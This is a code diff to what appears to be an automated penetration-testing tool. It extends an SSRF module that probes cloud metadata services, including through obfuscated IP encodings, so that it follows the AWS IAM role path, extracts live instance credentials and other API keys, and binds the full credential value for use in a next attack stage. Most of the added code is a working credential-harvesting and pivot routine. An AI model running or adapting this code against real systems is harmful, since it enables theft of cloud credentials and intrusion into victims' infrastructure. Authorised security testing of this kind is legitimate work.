@@ -1,7 +1,9 @@
 """SSRF detection actions — basic, blind, cloud-metadata probing."""
 
+import re
+
 from actions.registry import action, ActionContext, ActionResult
-from core.validators import inject_param
+from core.validators import extract_secrets, inject_param
 from core.verification_oracle import VerificationOracle, make_oob_client
 from tools.wrappers import curl
 
@@ -10,6 +12,14 @@ from tools.wrappers import curl
 # dotted, decimal, octal, hex and IPv6-mapped all resolve to 169.254.169.254.
 # Trying each is how an SSRF that is "blocked" on the obvious string still
 # reaches the metadata service.
+# Secret types worth threading into the next chain leg. Identical rule set to
+# the LFI action: only a structurally valid credential is bound.
+_BINDABLE_SECRETS = {
+    "aws_access_key", "github_pat", "github_fine_grained", "openai_key",
+    "openai_project_key", "slack_token", "stripe_live_key",
+    "google_api_key", "private_key", "jwt_token",
+}
+
 _AWS_HOSTS = (
     "169.254.169.254",      # dotted
     "2852039166",           # decimal
@@ -72,6 +82,31 @@ async def ssrf_cloud_metadata(ctx: ActionContext) -> ActionResult:
     method = ctx.params.get("method", "GET")
 
     findings = []
+    credential = ""
+
+    def _record(metadata_url: str, body: str, hit: str) -> None:
+        nonlocal credential
+        # A metadata document that carries instance credentials is the point
+        # of the pivot: hand the full value to the causal layer and keep only
+        # the redacted form in the finding.
+        secrets = [s for s in extract_secrets(body)
+                   if s.get("type") in _BINDABLE_SECRETS
+                   and s.get("validation", {}).get("verdict")
+                   == "structurally_valid"]
+        preview = body[:300]
+        for secret in secrets:
+            preview = preview.replace(secret["value"], secret["redacted"])
+        if secrets and not credential:
+            credential = secrets[0]["value"]
+        findings.append({
+            "provider": provider,
+            "metadata_url": metadata_url,
+            "status": 200,
+            "marker": hit,
+            "body_preview": preview,
+            "secrets": [{"type": s["type"], "redacted": s["redacted"]}
+                        for s in secrets],
+        })
 
     for provider, metadata_urls in CLOUD_METADATA_URLS.items():
         markers = CLOUD_METADATA_MARKERS.get(provider, ())
@@ -80,25 +115,43 @@ async def ssrf_cloud_metadata(ctx: ActionContext) -> ActionResult:
             result = await curl(test_url, method=method, output="full")
             body = result.get("body", "") or ""
             status = result.get("status", 0)
+            if not (status == 200 and body):
+                continue
             lowered = body.lower()
+            hit = next((marker for marker in markers if marker in lowered), "")
+            if hit and len(body) > 10:
+                _record(metadata_url, body, hit)
+                continue
 
-            if status == 200 and body and len(body) > 10 and \
-                    any(marker in lowered for marker in markers):
-                hit = next(marker for marker in markers if marker in lowered)
-                findings.append({
-                    "provider": provider,
-                    "metadata_url": metadata_url,
-                    "status": status,
-                    "marker": hit,
-                    "body_preview": body[:300],
-                })
+            # AWS role listing: this URL answers with the role *name* in plain
+            # text, and the credentials live one path down. Stopping here is
+            # why the extract leg never produced a key even on a reachable
+            # metadata service.
+            if metadata_url.endswith("/iam/security-credentials/"):
+                role = body.strip().splitlines()[0].strip()
+                if not re.fullmatch(r"[A-Za-z0-9+=,.@_-]{1,128}", role):
+                    continue
+                role_url = metadata_url + role
+                role_result = await curl(
+                    inject_param(url, param, role_url),
+                    method=method, output="full")
+                role_body = role_result.get("body", "") or ""
+                if (role_result.get("status") == 200
+                        and "AccessKeyId" in role_body):
+                    _record(role_url, role_body, "AccessKeyId")
 
     if findings:
+        bindings = {"credential": credential} if credential else {}
         return ActionResult(
             success=True,
-            confidence="FIRM",
+            # Reaching a metadatum is FIRM at worst; a document that carries
+            # usable credentials is proof of the pivot, and identity recording
+            # downstream only accepts CONFIRMED legs.
+            confidence="CONFIRMED" if credential else "FIRM",
             data={"findings": findings},
-            evidence={"ssrf_cloud": {"url": url, "param": param, "findings": findings}},
+            evidence={"ssrf_cloud": {"url": url, "param": param,
+                                     "findings": findings}},
+            bindings=bindings,
         )
 
     return ActionResult(False, error="no cloud metadata accessible via SSRF",
